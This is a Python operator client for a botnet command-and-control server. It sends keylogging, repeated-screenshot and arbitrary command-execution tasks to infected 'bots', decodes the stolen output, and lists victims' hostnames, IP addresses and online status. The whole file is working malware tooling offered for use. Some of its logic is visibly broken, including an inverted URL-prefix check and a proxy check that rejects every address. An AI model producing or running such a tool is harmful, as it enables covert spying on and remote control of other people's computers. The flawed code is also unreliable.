import requests as r
import json
from base64 import b64encode, b64decode
import argparse as ap
from urllib3.exceptions import InsecureRequestWarning
r.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def newRequest(c2url, proxy, creds, reqtype, targets, arguments):
    
    targets = targets.split(',')
    if reqtype == 'keylog':
        arguments = {"cmd":arguments}
    elif reqtype == 'printscreen':
        num_prints, interval = arguments.split(',')
        arguments = {"num_prints":int(num_prints), "interval":int(interval)}
    elif reqtype == 'cmdexec':
        arguments = {"cmd":' '.join(arguments)}

    reqdata = {"targets":targets, "request_type":reqtype, "arguments":arguments}
    req = r.post(c2url+'/newRequest', auth=creds, verify=False, json=reqdata, proxies=proxy)
    reqJson = json.loads(req.content.decode().strip())
    print(json.dumps(reqJson, indent=4, sort_keys=True))

def checkTask(c2url, proxy, creds, taskid):

    req = r.get(c2url+'/checkTask/'+taskid, auth=creds, verify=False, proxies=proxy)
    reqJson = json.loads(req.content.decode().strip())

    if isinstance(reqJson['data'], str) and reqJson['data'] != '':
        try:
            print(b64decode(reqJson['data']).decode('latin'))
        except Exception:
            print(b64decode(reqJson['data']+'=').decode('latin'))
        except:
            print(b64decode(reqJson['data']+'==').decode('latin'))
    elif not isinstance(reqJson['data'], str) and len(reqJson['data']) > 0:
        for filename in reqJson['data']:
            print(filename)
    else:
        print(json.dumps(reqJson, indent=4, sort_keys=True))

def getOverview(c2url, proxy, creds):

    req = r.get(c2url+'/getOverview', auth=creds, verify=False, proxies=proxy)
    reqJson = json.loads(req.content.decode().strip())

    try:
        print('Total number of bots: %i' % reqJson['numBots'])
        print('Bots online:')
        [print(json.dumps(bot, indent=4, sort_keys=True)) for bot in reqJson['online']]
        print('Bots offline:')
        [print(json.dumps(bot, indent=4, sort_keys=True)) for bot in reqJson['offline']]
    except:
        print(json.dumps(reqJson, indent=4, sort_keys=True))

def getStatus(c2url, proxy, creds, botid):

    req = r.get(f'{c2url}/getStatus/{botid}', auth=creds, verify=False, proxies=proxy)
    reqJson = json.loads(req.content.decode().strip())

    try:
        print(f"Bot id       : {botid}")
        print(f"Hostname     : {reqJson['hostname']}")
        print(f"IP address   : {reqJson['ip_address']}")
        print(f"Online       : {reqJson['online']}")
        print(f"Last checkin : {reqJson['last_check']}")
    except:
        print(json.dumps(reqJson, indent=4, sort_keys=True))

if __name__ == '__main__':
    parser = ap.ArgumentParser(description='Interact with the REST C2')
    authoptions = parser.add_argument_group('Authentication')
    authoptions.add_argument('--user', '-u', help='Username for authentication.', required=True)
    authoptions.add_argument('--password', '-p', help='Password for the specified username.', required=True)
    requestsoptions = parser.add_argument_group('Requests')
    exclusivereqs = requestsoptions.add_mutually_exclusive_group()
    exclusivereqs.add_argument('--new', '-n', choices=['keylog','printscreen', 'cmdexec'], help='Issue a new request for the C2. Request types are "keylog" , "cmdexec" and "printscreen".')
    exclusivereqs.add_argument('--checktask', '-c', help='Check the status of a given task.')
    exclusivereqs.add_argument('--overview', '-o', help='Get an overview of the bots.', action='store_true')
    exclusivereqs.add_argument('--bot', '-b', help='Get the status of a bot.')
    requestsoptions.add_argument('--targets', '-t', help='Targets to issue the request to, separated by a comma.')
    requestsoptions.add_argument('--keylogcmd', '-kc', choices=['start','dump','stop'], help='Keylog options: <start|dump|stop>.')
    requestsoptions.add_argument('--screenoptions', '-so', help='Printscreen options: amount and interval separated by a comma.')
    requestsoptions.add_argument('--cmdoptions', '-co', nargs='+', help='Command execution options: The command to be executed.')
    requestsoptions.add_argument('--c2url', '-c2', help='The URL for the C2 server.', required=True)
    requestsoptions.add_argument('--proxy', '-y', default=None, help='A proxy address, if required.')

    args = parser.parse_args()

    if args.new and not args.targets:
        parser.error('New request require at least one target.')
    elif args.new == 'keylog' and not args.keylogcmd:
        parser.error('Keylog requests require option --keylogcmd <start|dump|stop>.')
    elif args.new == 'printscreen' and not args.screenoptions:
        parser.error('Printscreen requests require option --screenoptions <amount,interval>.')
    elif args.new == 'cmdexec' and not args.cmdoptions:
        parser.error('Command execution requests require option --cmdoptions <command to be executed>.')

    if args.c2url.startswith('http'):
        args.c2url = 'http://'+args.c2url
    
    if args.proxy and (not args.proxy.startswith('http') or not args.proxy.startswith('socks')):
        parser.error('Proxy address must start with http or socks')

    creds = (args.user, args.password)

    if args.new == 'keylog':
        newRequest(args.c2url, args.proxy, creds, args.new, args.targets, args.keylogcmd)
    elif args.new == 'printscreen':
        newRequest(args.c2url, args.proxy, creds, args.new, args.targets, args.screenoptions)
    elif args.new == 'cmdexec':
        newRequest(args.c2url, args.proxy, creds, args.new, args.targets, args.cmdoptions)
    elif args.checktask:
        checkTask(args.c2url, args.proxy, creds, args.checktask)
    elif args.overview:
        getOverview(args.c2url, args.proxy, creds)
    elif args.bot:
        getStatus(args.c2url, args.proxy, creds, args.bot)
